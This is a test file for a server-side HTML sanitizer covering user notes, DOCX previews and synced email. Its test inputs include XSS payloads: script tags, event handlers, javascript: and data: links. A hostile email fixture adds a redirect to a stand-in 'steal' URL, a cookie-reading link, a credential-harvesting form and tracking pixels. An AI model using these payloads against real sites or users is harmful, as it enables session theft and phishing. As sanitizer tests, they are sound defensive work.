/**
 * Pure-function tests for the shared HTML sanitizer.
 *
 * Three callers (notes, captures, inbox replies) post HTML from
 * the Tiptap editor. The sanitizer runs server-side on every
 * write — it's the security boundary between user input and the
 * stored markup. These tests document the allow-list and the
 * scrubbing behavior so a future "let's allow <img>" change has
 * to update the test along with the allow-list.
 */

import { describe, expect, test } from "vitest";
import {
  BLOCKED_IMAGE_PLACEHOLDER,
  isEffectivelyEmpty,
  sanitizeDocumentHtml,
  sanitizeEmailHtml,
  sanitizeUserHtml,
} from "./sanitize-html";

describe("sanitizeUserHtml — allowed tags pass through", () => {
  test("plain paragraph survives", () => {
    expect(sanitizeUserHtml("<p>Hello</p>")).toBe("<p>Hello</p>");
  });

  test("Tiptap StarterKit shape — bold/italic/strike/underline/code", () => {
    const html =
      "<p><strong>b</strong> <em>i</em> <s>s</s> <u>u</u> <code>c</code></p>";
    expect(sanitizeUserHtml(html)).toBe(html);
  });

  test("lists + headings + blockquote", () => {
    const html =
      "<h2>Header</h2><blockquote><p>Quote</p></blockquote>" +
      "<ul><li>one</li><li>two</li></ul><ol><li>a</li></ol>";
    expect(sanitizeUserHtml(html)).toBe(html);
  });
});

describe("sanitizeUserHtml — disallowed content is stripped", () => {
  test("<script> tag and its contents are gone", () => {
    const html = "<p>Hi</p><script>alert(1)</script>";
    const out = sanitizeUserHtml(html);
    expect(out).toBe("<p>Hi</p>");
    expect(out).not.toContain("alert");
    expect(out).not.toContain("script");
  });

  test("inline event handlers are stripped", () => {
    const html = '<p onclick="alert(1)">Click</p>';
    const out = sanitizeUserHtml(html);
    expect(out).toBe("<p>Click</p>");
    expect(out).not.toContain("onclick");
  });

  test("style attributes are stripped", () => {
    const html = '<p style="color: red">Red</p>';
    const out = sanitizeUserHtml(html);
    expect(out).not.toContain("style");
  });

  test("<iframe> is removed entirely", () => {
    const html = '<p>Before</p><iframe src="https://evil"></iframe><p>After</p>';
    const out = sanitizeUserHtml(html);
    expect(out).toContain("Before");
    expect(out).toContain("After");
    expect(out).not.toContain("iframe");
  });

  test("<img> isn't on the allow-list — dropped", () => {
    // Today the editor doesn't emit <img>; if we add an image
    // extension we'll need to update both the editor and the
    // sanitizer. The test pins the current behavior.
    const html = '<p>x</p><img src="https://x" />';
    const out = sanitizeUserHtml(html);
    expect(out).not.toContain("<img");
  });
});

describe("sanitizeUserHtml — link safety", () => {
  test("javascript: URLs are stripped", () => {
    const html = '<a href="javascript:alert(1)">click</a>';
    const out = sanitizeUserHtml(html);
    expect(out).not.toContain("javascript:");
    // The href is dropped but the surrounding tag may remain — we
    // only care that the dangerous URL is gone.
    expect(out).not.toContain("alert");
  });

  test("data: URLs are stripped", () => {
    const html = '<a href="data:text/html,<script>alert(1)</script>">x</a>';
    const out = sanitizeUserHtml(html);
    expect(out).not.toContain("data:");
  });

  test("http/https/mailto/tel pass through", () => {
    const cases = [
      "https://example.com",
      "http://example.com",
      "mailto:a@b.com",
      "tel:+1-303-555-0100",
    ];
    for (const href of cases) {
      const out = sanitizeUserHtml(`<a href="${href}">link</a>`);
      expect(out).toContain(href);
    }
  });

  test("every <a> gets rel='noopener noreferrer' and target='_blank'", () => {
    // Reverse-tabnabbing protection: any external link the user
    // creates should open in a new tab without giving the new
    // window a window.opener handle back to the parent.
    const out = sanitizeUserHtml('<a href="https://example.com">x</a>');
    expect(out).toContain('rel="noopener noreferrer"');
    expect(out).toContain('target="_blank"');
  });

  test("existing rel/target on a link gets replaced (no opt-out)", () => {
    // Even if the user (or a malicious paste) sets rel="opener",
    // the transform forces our values back.
    const out = sanitizeUserHtml(
      '<a href="https://example.com" rel="opener" target="_self">x</a>'
    );
    expect(out).toContain('rel="noopener noreferrer"');
    expect(out).toContain('target="_blank"');
    expect(out).not.toContain('rel="opener"');
  });
});

describe("sanitizeUserHtml — output cleanliness", () => {
  test("trims leading/trailing whitespace", () => {
    expect(sanitizeUserHtml("   <p>Hi</p>   ")).toBe("<p>Hi</p>");
  });

  test("empty input returns empty", () => {
    expect(sanitizeUserHtml("")).toBe("");
  });

  test("only-whitespace input returns empty", () => {
    expect(sanitizeUserHtml("   \n  \t  ")).toBe("");
  });
});

// ── Document profile (DOCX preview pipeline) ────────────────────────────

describe("sanitizeDocumentHtml — document structure passes through", () => {
  test("note-profile tags still pass (superset, not a replacement)", () => {
    const html =
      "<h2>Header</h2><p><strong>b</strong> <em>i</em> <u>u</u></p>" +
      "<ul><li>one</li></ul>";
    expect(sanitizeDocumentHtml(html)).toBe(html);
  });

  test("tables with colspan/rowspan survive", () => {
    const html =
      "<table><thead><tr><th colspan=\"2\">H</th></tr></thead>" +
      "<tbody><tr><td rowspan=\"2\">a</td><td>b</td></tr></tbody></table>";
    expect(sanitizeDocumentHtml(html)).toBe(html);
  });

  test("b / i / sup / sub / hr survive (mammoth custom style maps)", () => {
    const html = "<p><b>b</b><i>i</i>x<sup>2</sup>H<sub>2</sub>O</p><hr />";
    expect(sanitizeDocumentHtml(html)).toBe(html);
  });

  test("embedded images survive with data: URIs only", () => {
    const data =
      '<img src="data:image/png;base64,iVBORw0KGgo=" alt="exhibit" />';
    expect(sanitizeDocumentHtml(data)).toBe(data);
  });
});

describe("sanitizeDocumentHtml — still a security boundary", () => {
  test("script tags + contents are discarded", () => {
    const out = sanitizeDocumentHtml("<p>Hi</p><script>alert(1)</script>");
    expect(out).toBe("<p>Hi</p>");
  });

  test("event handlers and style attributes are stripped", () => {
    const out = sanitizeDocumentHtml(
      '<td onclick="alert(1)" style="position:fixed">x</td>'
    );
    expect(out).not.toContain("onclick");
    expect(out).not.toContain("style");
  });

  test("remote image sources are stripped (tracking-pixel canary)", () => {
    const out = sanitizeDocumentHtml('<img src="https://evil.example/p.png" />');
    expect(out).not.toContain("evil.example");
  });

  test("protocol-relative image sources are stripped", () => {
    const out = sanitizeDocumentHtml('<img src="//evil.example/p.png" />');
    expect(out).not.toContain("evil.example");
  });

  test("javascript: links are stripped, links get noopener/_blank", () => {
    const out = sanitizeDocumentHtml(
      '<a href="javascript:alert(1)">x</a><a href="https://example.com">y</a>'
    );
    expect(out).not.toContain("javascript:");
    expect(out).toContain('rel="noopener noreferrer"');
    expect(out).toContain('target="_blank"');
  });

  test("iframe / object / style blocks are discarded", () => {
    const out = sanitizeDocumentHtml(
      '<style>p{display:none}</style><iframe src="https://x"></iframe>' +
        '<object data="x"></object><p>kept</p>'
    );
    expect(out).toBe("<p>kept</p>");
  });
});

describe("sanitizeDocumentHtml — note profile is NOT loosened", () => {
  test("tables are still stripped from the note profile", () => {
    // The document profile is additive; the note sanitizer must keep
    // rejecting tags only documents may carry.
    const out = sanitizeUserHtml("<table><tr><td>x</td></tr></table>");
    expect(out).not.toContain("<table");
    expect(out).not.toContain("<td");
  });

  test("data-URI images are still stripped from the note profile", () => {
    const out = sanitizeUserHtml(
      '<img src="data:image/png;base64,iVBORw0KGgo=" />'
    );
    expect(out).not.toContain("<img");
  });
});

describe("isEffectivelyEmpty", () => {
  test("no content is empty", () => {
    expect(isEffectivelyEmpty("")).toBe(true);
  });

  test("just tag scaffolding (Tiptap's empty editor) is empty", () => {
    expect(isEffectivelyEmpty("<p></p>")).toBe(true);
    expect(isEffectivelyEmpty("<p><br></p>")).toBe(true);
  });

  test("only whitespace + nbsp is empty", () => {
    expect(isEffectivelyEmpty("<p>&nbsp;&nbsp;</p>")).toBe(true);
    expect(isEffectivelyEmpty("<p>   </p>")).toBe(true);
  });

  test("real text is not empty", () => {
    expect(isEffectivelyEmpty("<p>Hello</p>")).toBe(false);
  });

  test("nested tags with text are not empty", () => {
    expect(isEffectivelyEmpty("<p><strong>x</strong></p>")).toBe(false);
  });
});

// ── Email profile ───────────────────────────────────────────────────────
//
// `sanitizeEmailHtml` runs at WRITE time on provider-synced mail
// (Gmail sync) — the most hostile input the app ingests. These tests
// pin the security boundary against a realistic hostile fixture and
// document the tracking-pixel / inline-style policy.

/** Hostile mail body: script, event handler, javascript: link,
 *  iframe, form, style tag, tracking pixel, protocol-relative img. */
const HOSTILE_EMAIL = [
  "<div>",
  "<script>document.location='https://evil.example/steal'</script>",
  '<img src="https://tracker.example/pixel.gif?u=abc" alt="" width="1" height="1">',
  '<img src="//tracker.example/p2.gif">',
  '<p onmouseover="alert(1)">Dear <b>Counsel</b>,</p>',
  '<a href="javascript:alert(document.cookie)">click me</a>',
  '<iframe src="https://evil.example/phish"></iframe>',
  '<form action="https://evil.example/creds"><input name="password"></form>',
  "<style>body{display:none}</style>",
  '<p style="color:#333;position:fixed;top:0;background-image:url(https://evil.example/x)">Body text</p>',
  "</div>",
].join("");

describe("sanitizeEmailHtml — hostile mail is defanged", () => {
  test("script tags AND their payload are gone", () => {
    const out = sanitizeEmailHtml(HOSTILE_EMAIL);
    expect(out).not.toContain("<script");
    expect(out).not.toContain("evil.example/steal");
  });

  test("event handlers are stripped, content survives", () => {
    const out = sanitizeEmailHtml(HOSTILE_EMAIL);
    expect(out).not.toContain("onmouseover");
    expect(out).toContain("Dear <b>Counsel</b>,");
  });

  test("javascript: hrefs are removed (text kept, scheme gone)", () => {
    const out = sanitizeEmailHtml(HOSTILE_EMAIL);
    expect(out).not.toContain("javascript:");
    expect(out).toContain("click me");
  });

  test("iframe / form / style tags are discarded", () => {
    const out = sanitizeEmailHtml(HOSTILE_EMAIL);
    expect(out).not.toContain("<iframe");
    expect(out).not.toContain("<form");
    expect(out).not.toContain("<input");
    expect(out).not.toContain("display:none");
  });

  test("style attr keeps the safe subset, drops position/background-image", () => {
    const out = sanitizeEmailHtml(HOSTILE_EMAIL);
    expect(out).toContain("color:#333");
    expect(out).not.toContain("position");
    expect(out).not.toContain("url(");
    expect(out).toContain("Body text");
  });
});

describe("sanitizeEmailHtml — remote images become blocked-image notes", () => {
  test("http(s) tracking pixel → placeholder span, URL fully gone", () => {
    const out = sanitizeEmailHtml(HOSTILE_EMAIL);
    expect(out).not.toContain("tracker.example");
    expect(out).not.toContain("<img");
    expect(out).toContain(BLOCKED_IMAGE_PLACEHOLDER);
    expect(out).toContain('class="email-blocked-image"');
  });

  test("alt text is preserved in the placeholder", () => {
    const out = sanitizeEmailHtml(
      '<img src="https://cdn.example/logo.png" alt="Firm logo">'
    );
    expect(out).toBe(
      '<span class="email-blocked-image">[image blocked: Firm logo]</span>'
    );
  });

  test("cid: inline references are blocked too (no fetchable bytes)", () => {
    const out = sanitizeEmailHtml('<img src="cid:part1.abc@mailer">');
    expect(out).toContain(BLOCKED_IMAGE_PLACEHOLDER);
    expect(out).not.toContain("cid:");
  });

  test("data: URI images render (inline, no network fetch)", () => {
    const html = '<img src="data:image/png;base64,iVBORw0KGgo=" alt="sig" />';
    const out = sanitizeEmailHtml(html);
    expect(out).toContain("<img");
    expect(out).toContain("data:image/png;base64,iVBORw0KGgo=");
  });
});

describe("sanitizeEmailHtml — real-mail structure passes through", () => {
  test("div soup, tables, links survive (links forced safe)", () => {
    const out = sanitizeEmailHtml(
      '<div><table><tbody><tr><td colspan="2">cell</td></tr></tbody></table>' +
        '<a href="https://court.example/filing">filing</a></div>'
    );
    expect(out).toContain("<div>");
    expect(out).toContain('<td colspan="2">cell</td>');
    expect(out).toContain('rel="noopener noreferrer"');
    expect(out).toContain('target="_blank"');
  });

  test("unknown-but-harmless tags degrade to their text content", () => {
    expect(sanitizeEmailHtml("<font color=\"red\">warm regards</font>")).toBe(
      "warm regards"
    );
  });
});

describe("sanitizeEmailHtml — other profiles are NOT loosened", () => {
  test("note profile still strips div and style attrs", () => {
    const out = sanitizeUserHtml('<div style="color:red"><p>x</p></div>');
    expect(out).not.toContain("<div");
    expect(out).not.toContain("style=");
  });

  test("document profile still blocks remote images outright", () => {
    const out = sanitizeDocumentHtml('<img src="https://evil.example/x.png">');
    expect(out).not.toContain("evil.example");
  });
});
